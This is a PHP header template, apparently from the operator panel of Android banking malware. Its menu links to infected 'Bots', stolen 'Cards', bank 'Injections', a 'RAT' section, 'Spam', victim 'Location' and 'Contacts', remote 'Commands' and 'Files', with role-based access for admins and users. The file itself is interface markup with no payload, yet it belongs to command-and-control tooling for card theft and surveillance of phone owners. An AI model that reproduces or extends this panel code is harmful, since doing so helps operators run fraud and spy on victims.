


<?php

$functions = new functions;
$getBots = $functions->getBots();
$getCards = $functions->getCards();
$getInjections = $functions->getInjections();


?>



<div class="menu2 header" style="background: #1D1F24;">


	<nav class="navbar navbar-icon-top navbar-expand-lg navbar-dark bg-dark">
    <a class="navbar-brand"><img width = "140" src="images/icons/panel/header.png"/></a>


      <ul class="navbar-nav mr-auto">



        <li class="nav-item" style="color:red; margin-right: 15px;margin-left: 25px; margin-top: 28px;">
          <a  href="?cont=bots&page=1" >
						<p class="icon_label" style='margin-left:22px; margin-top: -9px;'><?php echo $getBots;?></p>
						<center>
            <i class="fa fa-android fa-2x ">
              <span class="sr-only">(current)</span>
            </i></br>
						<B>  Bots </B>
						</center>
          </a>
        </li>

				<li class="nav-item" style="margin-right: 15px; margin-top: 28px">
          <a class="nav-listyle='margin-left:27px; margin-top: -9px;'nk" href="?cont=statistic">
						<center>
            <i class="fa fa-area-chart fa-2x">
              <span class="sr-only">(current)</span>
            </i></br>
						<B>  Statistic </B>
						</center>
          </a>
        </li>
<?php
	if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){

			echo "<li class='nav-item' style='margin-right: 15px; margin-top: 28px'>
					<a class='nav-link' href='?cont=numbers'>
		 			<center>
						<i class='fa fa-address-book fa-2x '>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  Contacts </B>
						</center>
					</a>
				</li>

				<li class='nav-item' style='margin-right: 15px; margin-top: 28px'>
					<a class='nav-link' href='?cont=cards&find=' >
				<center>
					<p class='icon_label' style='margin-left:27px; margin-top: -9px;'>$getCards</p>
						<i class='fa fa-credit-card fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  Cards </B>
						</center>
					</a>
				</li>

				<li class='nav-item' style='margin-right: 15px; margin-top: 28px'>
					<a class='nav-link' href='?cont=injections&find=' >
						<center>
							<p class='icon_label' style='margin-left:37px; margin-top:-9px;'>$getInjections</p>
						<i class='fa fa-university fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  Injections</B>
						</center>
					</a>
				</li>

				<li class='nav-item' style='margin-right: 18px; margin-top: 28px'>
					<a class='nav-link' href='?cont=ws&page=' >
					<center>
						<i class='fa fa-bug fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  RAT </B>
						</center>
					</a>
				</li>";
	}
  if ($_SESSION['panel_right']=="admin"){
			echo 	"<li class='nav-item' style='margin-right: 18px; margin-top: 28px'>
					<a class='nav-link' href='?cont=files'>
						<center>
						<i class='fa fa-file fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  Files </B>
						</center>
					</a>
				</li>";
  }
	if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
				echo "<li class='nav-item' style='margin-right: 18px; margin-top: 28px'>
					<a class='nav-link' href='?cont=spam'>
						<center>
						<i class='fa fa-envelope-open fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B> Spam </B>
						</center>
					</a>
				</li>

				<li class='nav-item' style='margin-right: 15px; margin-top: 28px'>
					<a class='nav-link' href='?cont=maps'>
						<center>
						<i class='fa fa-globe fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  Location </B>
						</center>
					</a>
				</li>

				<li class='nav-item' style='margin-right: 18px; margin-top: 28px'>
					<a class='nav-link' href='?cont=commands'>
						<center>
						<i class='fa fa-list-alt fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  List </B>
						</center>
					</a>
				</li>";
}

if ($_SESSION['panel_right']=="admin"){
			echo	"<li class='nav-item' style='margin-right: 15px; margin-top: 28px'>
					<a class='nav-link' href='?cont=settings' >
								<center>
						<i class='fa fa-cogs fa-2x'>
							<span class='sr-only'>(current)</span>
						</i></br>
						<B>  Settings </B>
						</center>
					</a>
				</li>";
}
?>

				<!--Exit-->
				<div style=" position: absolute;  top: 28px;  right: 20px;  width: auto;  height: auto;">
				<li class="nav-item" style="">
					<a class="nav-link" href="?cont=exit">
								<center>
						<i class="fa fa-power-off fa-3x">
							<span class="sr-only">(current)</span>
						</i></br>

						</center>
					</a>
				</li>
			</div>

      </ul>
  </nav>

















<!--fokjngoksgnegnsfqe
<ul>

	<li style="float:left; padding-left: 3px;"><img src="images/icons/panel/header.png" width='104px'/></li>
	<div class="ac">

	<div class="exit">
    <li style="padding-top:0px;"><a href="?cont=exit"><img src="images/icons/panel/exit.png"  width='50px'/></a></li>
	 </div>

	 <?php
	 	if ($_SESSION['panel_right']=="admin"){
		echo "<li style='padding-top:0px;'><a href='?cont=settings&page='><img src='images/icons/panel/settings.png' height='50px'width='30px'/></a></li>";
		}


		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		$functions = new functions;
		$getBots = $functions->getBots();
		$getCards = $functions->getCards();
		$getInjections = $functions->getInjections();

		echo "
			<li style='padding-top:0px;'><a href='?cont=commands'><img src='images/icons/panel/comands.png' height='50px'width='30px'/></a></li>

			<li style='padding-top:0px;'><a href='?cont=maps'><img src='images/icons/panel/map.png' height='50px'width='30px'/></a></li>

			<li style='padding-top:0px;'><a href='?cont=spam'><img src='images/icons/panel/spam.png' height='50px'width='30px'/></a></li>
";
if ($_SESSION['panel_right']=="admin"){
	echo "<li style='padding-top:0px;'><a href='?cont=files'><img src='images/icons/panel/files.png' height='50px'width='30px'/></a></li>
";
}


echo"
			<li style='padding-top:0px;'><a href='?cont=ws&page='><img src='images/icons/panel/websocket.png' height='50px'width='30px'/></a></li>

			<li style='padding-top:0px;'><a href='?cont=injections&find='>
			<p class='icon_label' style='margin-left:25px;'>$getInjections</p>
			<img src='images/icons/panel/injections.png' height='50px'width='30px'/>
			</a>
			</li>

			<li style='padding-top:0px;'><a href='?cont=cards&find='>
			<p class='icon_label' style='margin-left:25px;'>$getCards</p>
			<img src='images/icons/panel/cards.png' height='50px'width='30px'/>
			</a>
			</li>";

			if ($_SESSION['panel_right']=="admin"){
				echo "<li style='padding-top:0px;'><a href='?cont=numbers'><img src='images/icons/panel/contacticon.png' height='50px'width='30px'/></a></li>";
			}


	}


	 ?>

	<li style='padding-top:0px;'><a href="?cont=statistic"><img src="images/icons/panel/statistic.png" height='50px'width='30px'/></a></li>

	<li style="padding-top:0px;"><a href="?cont=bots&page=1">
	<p class="icon_label"><?php echo $getBots;?></p>
	<img src="images/icons/panel/bots.png" height='50px'width='30px'/>
	</a>
	</li>


	</div>
	<li style="padding-top:0px;"><a><img src="images/not.png" width='0px' height='50px'/></a></li>


</ul>
-->
</div>
